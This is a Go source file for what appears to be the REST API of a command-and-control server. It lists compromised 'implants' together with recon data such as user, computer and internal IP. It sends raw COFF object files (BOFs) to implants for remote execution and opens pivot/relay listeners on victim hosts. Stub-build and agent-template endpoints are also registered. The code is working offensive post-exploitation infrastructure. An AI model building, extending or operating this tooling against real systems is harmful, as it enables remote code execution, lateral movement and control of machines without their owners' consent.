package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"strconv"
	"strings"
)

// mountAPI registers all REST handlers on the given mux.
func mountAPI(mux *http.ServeMux) {
	mux.HandleFunc("/api/auth/login", authLoginHandler)
	mux.HandleFunc("/auth/login", authLoginHandler)
	mux.HandleFunc("/api/implants", implantsHandler)
	mux.HandleFunc("/api/implants/", implantHandler)
	mux.HandleFunc("/api/bofs", bofsHandler)
	mux.HandleFunc("/api/bofs/", bofRunHandler)
	mux.HandleFunc("/api/tasks/", taskHandler)
	mux.HandleFunc("/api/listeners", listenersHandler)
	mux.HandleFunc("/api/listeners/", listenerHandler)
	mux.HandleFunc("/api/logs", logsHandler)
	mux.HandleFunc("/api/agents", agentsHandler)
	mux.HandleFunc("/api/agents/", agentArtifactsHandler)
	mux.HandleFunc("/api/stub/build", stubBuildHandler)
	mux.HandleFunc("/api/stub/save", stubSaveHandler)
	mux.HandleFunc("/api/agent/templates", agentTemplatesHandler)
	mux.HandleFunc("/ws", handleWS)
}

// GET /api/implants -> [{id,addr,since, internal_ip, user, computer, ...}, ...]
// Each live session is enriched with the recon fields collected by the auto-run
// sysinfo BOF (empty until that BOF reports back).
func implantsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "GET only", http.StatusMethodNotAllowed)
		return
	}
	writeJSON(w, http.StatusOK, manager.ListEnriched())
}

// /api/implants/{id}  with sub-actions:
//
//	POST /api/implants/{id}/hello
//	POST /api/implants/{id}/bof       body: {"bof":"<name|b64>","args":"<b64>"}
//	DELETE /api/implants/{id}
func implantHandler(w http.ResponseWriter, r *http.Request) {
	rest := strings.TrimPrefix(r.URL.Path, "/api/implants/")
	parts := strings.SplitN(rest, "/", 2)
	if len(parts) == 0 || parts[0] == "" {
		http.NotFound(w, r)
		return
	}
	id, err := strconv.ParseUint(parts[0], 10, 64)
	if err != nil {
		http.Error(w, "bad implant id", http.StatusBadRequest)
		return
	}
	action := ""
	if len(parts) == 2 {
		action = parts[1]
	}
	s, ok := manager.Get(id)
	if !ok {
		http.Error(w, "no such implant", http.StatusNotFound)
		return
	}

	switch {
	case action == "" && r.Method == http.MethodDelete:
		s.Close()
		writeJSON(w, http.StatusOK, map[string]string{"status": "closed"})
	case action == "hello" && r.Method == http.MethodPost:
		if err := s.Send(serverMsg{Type: "hello"}); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		writeJSON(w, http.StatusOK, map[string]string{"status": "sent"})
	case action == "bof" && r.Method == http.MethodPost:
		var body struct {
			Bof  string `json:"bof"`  // BOF library name OR raw base64 COFF
			Args string `json:"args"` // base64 raw arg buffer (optional)
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
			return
		}
		fileB64, err := boflib.Resolve(body.Bof)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		// Register a task BEFORE sending so a lightning-fast implant reply
		// can't arrive before the task exists.
		taskID := tasks.CreateNamed(id, body.Bof)
		if err := s.Send(serverMsg{Type: "bof", File: fileB64, Args: body.Args}); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		writeJSON(w, http.StatusOK, map[string]string{"task_id": taskID, "status": "sent"})
	case action == "relay" && r.Method == http.MethodPost:
		// Start a pivot/relay listener on the implant. The actual bound port
		// arrives async via the relay_started event (polled via GET .../relays).
		var body struct {
			BindIP string `json:"bind_ip"`
			Port   uint16 `json:"port"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
			return
		}
		if body.BindIP == "" {
			body.BindIP = "0.0.0.0"
		}
		relayID := newRelayID()
		if relayRegistry != nil {
			relayRegistry.Request(id, relayID, body.BindIP, body.Port)
		}
		if err := s.Send(serverMsg{Type: "relay_listen", RelayID: relayID, BindIP: body.BindIP, Port: body.Port}); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		writeJSON(w, http.StatusOK, map[string]string{"relay_id": relayID, "status": "requested"})
	case action == "relays" && r.Method == http.MethodGet:
		var list []RelayInfo
		if relayRegistry != nil {
			list = relayRegistry.List(id)
		}
		writeJSON(w, http.StatusOK, list)
	default:
		// /api/implants/{id}/relays/{rid}  DELETE -> stop one relay
		if strings.HasPrefix(action, "relays/") && r.Method == http.MethodDelete {
			rid := strings.TrimPrefix(action, "relays/")
			if rid == "" {
				http.Error(w, "relay id required", http.StatusBadRequest)
				return
			}
			if err := s.Send(serverMsg{Type: "relay_stop", RelayID: rid}); err != nil {
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}
			writeJSON(w, http.StatusOK, map[string]string{"relay_id": rid, "status": "stopping"})
			return
		}
		http.Error(w, "unsupported", http.StatusMethodNotAllowed)
	}
}

// newRelayID returns a short hex relay id (mirrors newListenerID).
func newRelayID() string {
	var b [4]byte
	_, _ = rand.Read(b[:])
	return "rl-" + hex.EncodeToString(b[:])
}

func writeJSON(w http.ResponseWriter, code int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_ = json.NewEncoder(w).Encode(v)
}
